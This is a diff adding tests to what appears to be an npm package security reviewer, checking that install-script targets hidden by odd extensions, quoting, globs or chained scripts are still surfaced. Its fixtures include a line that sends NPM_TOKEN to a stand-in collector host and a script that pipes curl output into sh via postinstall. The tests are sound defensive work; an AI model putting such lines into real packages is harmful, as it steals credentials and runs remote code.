@@ -207,6 +207,45 @@ describe("review input", () => {
     }
   });
 
+  test("install targets hidden by name, case, quotes, globs or a chained run are shown", () => {
+    const payload = "require('https').get('https://collector.example.invalid/?t=' + process.env.NPM_TOKEN);\n";
+    const script = "#!/bin/sh\ncurl -s https://collector.example.invalid/x | sh\n";
+
+    const cases = [
+      // a shebang runs whatever the name, and bash runs a script with a NUL in it
+      { scripts: { postinstall: "./setup.png" }, path: "setup.png", body: `${script}\0` },
+      { scripts: { postinstall: "./install.exe" }, path: "install.exe", body: script },
+      { scripts: { postinstall: "node './setup.txt'" }, path: "setup.txt", body: payload },
+      { scripts: { postinstall: "node ./pay*.txt" }, path: "payload.txt", body: payload },
+      { scripts: { postinstall: "node $PWD/payload.txt" }, path: "payload.txt", body: payload },
+      { scripts: { postinstall: "npm run setup", setup: "node ./payload.txt" }, path: "payload.txt", body: payload },
+    ];
+
+    for (const c of cases) {
+      const pkg = pkgOf({ "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", scripts: c.scripts }), "index.js": "module.exports = 1;\n", [c.path]: c.body });
+      const input = buildFilesInput({ name: "stand-in", version: "1.0.0", pkg });
+
+      expect(input.text).toContain(`=== FILE ${c.path} ===`);
+      expect(input.notRead.filter((n) => n.kind === "file")).toEqual([]);
+    }
+
+    // compiled machine code an install script runs is still listed as not read
+    const elf = packageFilesOf([
+      entry("package.json", JSON.stringify({ name: "stand-in", version: "1.0.0", scripts: { postinstall: "./bin/setup" } })),
+      { path: "bin/setup", size: 8, mode: 0o755, data: new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]) },
+    ]);
+
+    expect(buildFilesInput({ name: "stand-in", version: "1.0.0", pkg: elf }).notRead).toContainEqual({ kind: "file", path: "bin/setup", reason: "binary" });
+  });
+
+  test("code with an uppercase extension is code", () => {
+    const payload = "require('https').get('https://collector.example.invalid/?t=' + process.env.NPM_TOKEN);\n";
+    const input = buildFilesInput({ name: "stand-in", version: "1.0.0", pkg: pkgOf({ "package.json": "{}", "index.js": "require('./historyUtils.JS');\n", "historyUtils.JS": payload, "lib/helper.JS": payload }) });
+
+    expect(input.read).toContain("historyUtils.JS");
+    expect(input.read).toContain("lib/helper.JS");
+  });
+
   test("files where the rule-based signals fired come before plain code", () => {
     const pkg = pkgOf({
       "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", main: "index.js" }),
